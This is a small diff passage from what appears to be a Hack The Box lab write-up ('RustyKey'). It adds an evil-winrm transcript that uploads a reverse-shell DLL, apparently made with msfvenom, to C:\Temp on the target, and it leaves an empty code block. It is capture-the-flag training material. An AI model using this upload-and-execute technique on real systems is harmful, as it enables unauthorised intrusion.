@@ -527,7 +527,18 @@ Ill craft a payload using msfvenom
 
 Ill start a listener
 
+```python
+evil-winrm-py PS C:\Temp> upload shell.dll .
+Uploading /home/kali/htb/RustyKey/shell.dll: 100%|███████████████████████| 9.00k/9.00k [00:00<00:00, 138kB/s]
+[+] File uploaded successfully as: C:\Temp\shell.dll
+evil-winrm-py PS C:\Temp>
+```
 
+Ill use my evil-winrm session to make the upload simpler
+
+```python
+
+```
 
 
 
